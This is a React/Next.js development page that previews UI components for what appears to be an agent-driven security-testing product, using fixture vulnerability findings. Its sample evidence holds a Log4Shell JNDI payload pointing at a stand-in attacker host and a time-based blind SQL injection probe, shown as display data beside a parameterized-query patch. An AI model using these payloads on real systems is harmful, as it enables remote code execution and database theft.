/**
 * _dev/design-preview — gallery of atomic design-system components.
 *
 * Gated in production (returns notFound) so this route never ships to end users.
 * Mount path: /[locale]/_dev/design-preview
 *
 * W8 Chantier A → E atoms:
 *   A — FindingCard
 *   B — SeverityBadge
 *   C — AgentTransition
 *   D — EvidenceBlock
 *   E — ProgressBarPhases
 */
import { notFound } from 'next/navigation'
import { FindingCard } from '@/components/ui/finding-card'
import { SeverityBadge, type Severity } from '@/components/ui/severity-badge'
import { AgentTransition } from '@/components/ui/agent-transition'
import { EvidenceBlock } from '@/components/ui/evidence-block'
import { ProgressBarPhases } from '@/components/ui/progress-bar-phases'
import { allAgents, type AgentId } from '@/lib/agent-labels'

interface Fixture {
  severity: Severity
  title: string
  cve?: string
  cvss?: number
  mitre?: string
  agent?: AgentId
  verified?: boolean
  description: string
}

const FIXTURES: Fixture[] = [
  {
    severity: 'critical',
    title: 'Remote Code Execution via Log4Shell (JNDI injection)',
    cve: 'CVE-2021-44228',
    cvss: 9.8,
    mitre: 'T1190',
    agent: 'exploit',
    verified: true,
    description:
      'The target application uses Log4j 2.14.1 which is vulnerable to JNDI injection via the User-Agent header. A crafted payload loads a remote class and achieves unauthenticated RCE as the application user.',
  },
  {
    severity: 'high',
    title: 'Blind SQL Injection on /api/search endpoint',
    cve: 'CVE-2024-12345',
    cvss: 8.1,
    mitre: 'T1190',
    agent: 'recon',
    verified: true,
    description:
      'Time-based blind SQLi on the `q` parameter. Exfiltration confirmed via 8s DELAY payload against the public schema.',
  },
  {
    severity: 'medium',
    title: 'Stored XSS in admin audit log viewer',
    cvss: 6.1,
    mitre: 'T1059.007',
    agent: 'analyst',
    verified: false,
    description:
      'User-controlled fields in the audit log are rendered without escaping. A privileged admin viewing the log triggers script execution in their session context.',
  },
  {
    severity: 'low',
    title: 'Session cookie missing Secure attribute',
    cvss: 3.7,
    agent: 'recon',
    verified: true,
    description:
      'The `session_id` cookie is set without the Secure flag, allowing transmission over plain HTTP if TLS downgrade occurs.',
  },
  {
    severity: 'info',
    title: 'Server version disclosed in HTTP response headers',
    agent: 'recon',
    verified: false,
    description:
      'The `Server: nginx/1.24.0` header exposes the exact server version, aiding targeted exploit selection.',
  },
]

const SEVERITIES: Severity[] = ['critical', 'high', 'medium', 'low', 'info']

export default function DesignPreviewPage() {
  if (process.env.NODE_ENV === 'production') notFound()

  return (
    <div
      style={{
        minHeight: '100vh',
        backgroundColor: 'var(--bjhunt-bg)',
        color: 'var(--bjhunt-text)',
        padding: 40,
        fontFamily: 'var(--bjhunt-font-sans)',
      }}
    >
      <header style={{ marginBottom: 48, maxWidth: 1280 }}>
        <p
          style={{
            fontFamily: 'var(--bjhunt-font-mono)',
            fontSize: 'var(--bjhunt-text-xs)',
            color: 'var(--bjhunt-text-subtle)',
            textTransform: 'uppercase',
            letterSpacing: '0.2em',
            margin: 0,
          }}
        >
          _dev / design-preview — W8 atoms
        </p>
        <h1
          style={{
            fontSize: 32,
            fontWeight: 700,
            letterSpacing: '-0.02em',
            marginTop: 8,
            marginBottom: 4,
          }}
        >
          Atomic component gallery
        </h1>
        <p style={{ color: 'var(--bjhunt-text-muted)', fontSize: 14, margin: 0 }}>
          FindingCard · SeverityBadge · AgentTransition · EvidenceBlock · ProgressBarPhases
        </p>
      </header>

      {/* ───────── A — FindingCard ───────── */}
      <Section title="A · FindingCard — full density · all severities">
        <Grid>
          {FIXTURES.map((f) => (
            <FindingCard
              key={`full-${f.severity}`}
              {...f}
              verified
              onViewEvidence={() => {}}
              onViewRecommendation={() => {}}
            />
          ))}
        </Grid>
      </Section>

      <Section title="A · FindingCard — compact density (SOC list)">
        <div style={{ display: 'flex', flexDirection: 'column', gap: 8, maxWidth: 480 }}>
          {FIXTURES.map((f) => (
            <FindingCard
              key={`compact-${f.severity}`}
              {...f}
              compact
              onViewEvidence={() => {}}
              onViewRecommendation={() => {}}
            />
          ))}
        </div>
      </Section>

      {/* ───────── B — SeverityBadge ───────── */}
      <Section title="B · SeverityBadge — solid variant, sizes sm · md · lg">
        {(['sm', 'md', 'lg'] as const).map((sz) => (
          <Row key={sz} label={`Solid · ${sz.toUpperCase()}`}>
            {SEVERITIES.map((s) => (
              <SeverityBadge
                key={`solid-${sz}-${s}`}
                severity={s}
                size={sz}
                variant="solid"
                pulse={s === 'critical'}
                cvss={sz === 'lg' && s !== 'info' ? FIXTURES.find((f) => f.severity === s)?.cvss : undefined}
              />
            ))}
          </Row>
        ))}
      </Section>

      <Section title="B · SeverityBadge — outline + minimal variants">
        <Row label="Outline · MD">
          {SEVERITIES.map((s) => (
            <SeverityBadge key={`out-${s}`} severity={s} variant="outline" />
          ))}
        </Row>
        <Row label="Minimal · MD">
          {SEVERITIES.map((s) => (
            <SeverityBadge key={`min-${s}`} severity={s} variant="minimal" />
          ))}
        </Row>
      </Section>

      {/* ───────── C — AgentTransition ───────── */}
      <Section title="C · AgentTransition — full banner (Recon active)">
        <AgentTransition agentId="recon" />
      </Section>

      <Section title="C · AgentTransition — pills (chat message headers)">
        <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
          {(['decepticon', 'recon', 'exploit', 'analyst', 'defender'] as AgentId[]).map((id) => (
            <AgentTransition key={id} agentId={id} variant="pill" />
          ))}
        </div>
      </Section>

      <Section title="C · AgentTransition — mini indicators (all 17 agents)">
        <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
          {allAgents().map((a) => (
            <AgentTransition key={a.id} agentId={a.id} variant="mini" />
          ))}
        </div>
      </Section>

      {/* ───────── D — EvidenceBlock ───────── */}
      <Section title="D · EvidenceBlock — request · payload · diff">
        <div style={{ display: 'flex', flexDirection: 'column', gap: 20 }}>
          <EvidenceBlock
            kind="request"
            title="POST /api/search — blind SQLi probe"
            subtitle="HTTP/1.1"
            meta={[
              { label: 'status', value: '200' },
              { label: 'latency', value: '8.21s' },
            ]}
            hash="b9f3…c01e"
            lines={[
              { text: 'POST /api/search HTTP/1.1' },
              { text: 'Host: target.example.com' },
              { text: 'Content-Type: application/x-www-form-urlencoded' },
              { text: '' },
              { text: `q=widgets' AND (SELECT pg_sleep(8))--`, highlight: true },
            ]}
          />
          <EvidenceBlock
            kind="payload"
            title="Log4Shell JNDI payload"
            subtitle="User-Agent header"
            lines={[
              { text: '${jndi:ldap://attacker.example.com/a}', highlight: true },
            ]}
          />
          <EvidenceBlock
            kind="diff"
            title="Proposed patch — sanitize `q` before query"
            subtitle="src/api/search.ts"
            lines={[
              { text: "import { query } from '../db'", diff: 'context' },
              { text: '', diff: 'context' },
              { text: "- return query(`SELECT * FROM items WHERE name LIKE '%${q}%'`)", diff: 'remove' },
              { text: '+ return query(`SELECT * FROM items WHERE name LIKE $1`, [`%${q}%`])', diff: 'add' },
            ]}
          />
        </div>
      </Section>

      {/* ───────── E — ProgressBarPhases ───────── */}
      <Section title="E · ProgressBarPhases — Vuln Research Pipeline (active: Verifier)">
        <ProgressBarPhases
          phases={[
            { id: 'scan', label: 'Scanner',   state: 'complete', detail: '47 candidates' },
            { id: 'det',  label: 'Detector',  state: 'complete', detail: '12 confirmed' },
            { id: 'ver',  label: 'Verifier',  state: 'active',   detail: '7 / 12 PoCs', progress: 0.58 },
            { id: 'pat',  label: 'Patcher',   state: 'pending',  detail: '—' },
            { id: 'exp',  label: 'Exploiter', state: 'pending',  detail: '—' },
          ]}
        />
      </Section>

      <Section title="E · ProgressBarPhases — error state on Verifier">
        <ProgressBarPhases
          phases={[
            { id: 'scan', label: 'Scanner',   state: 'complete', detail: '47' },
            { id: 'det',  label: 'Detector',  state: 'complete', detail: '12' },
            { id: 'ver',  label: 'Verifier',  state: 'error',    detail: 'Sandbox timeout' },
            { id: 'pat',  label: 'Patcher',   state: 'pending' },
            { id: 'exp',  label: 'Exploiter', state: 'pending' },
          ]}
        />
      </Section>
    </div>
  )
}

function Section({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <section style={{ marginBottom: 56 }}>
      <h2
        style={{
          fontFamily: 'var(--bjhunt-font-mono)',
          fontSize: 'var(--bjhunt-text-xs)',
          color: 'var(--bjhunt-text-subtle)',
          textTransform: 'uppercase',
          letterSpacing: '0.2em',
          fontWeight: 500,
          marginBottom: 16,
          paddingBottom: 8,
          borderBottom: '1px solid var(--bjhunt-border)',
        }}
      >
        {title}
      </h2>
      {children}
    </section>
  )
}

function Grid({ children }: { children: React.ReactNode }) {
  return (
    <div
      style={{
        display: 'grid',
        gridTemplateColumns: 'repeat(auto-fill, minmax(420px, 1fr))',
        gap: 16,
        maxWidth: 1440,
      }}
    >
      {children}
    </div>
  )
}

function Row({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <div
      style={{
        display: 'flex',
        flexWrap: 'wrap',
        gap: 14,
        alignItems: 'center',
        padding: '16px 20px',
        border: '1px solid var(--bjhunt-border)',
        marginBottom: 2,
      }}
    >
      <span
        style={{
          fontFamily: 'var(--bjhunt-font-mono)',
          fontSize: 10,
          letterSpacing: '0.24em',
          textTransform: 'uppercase',
          color: 'var(--bjhunt-text-subtle)',
          minWidth: 120,
        }}
      >
        {label}
      </span>
      {children}
    </div>
  )
}
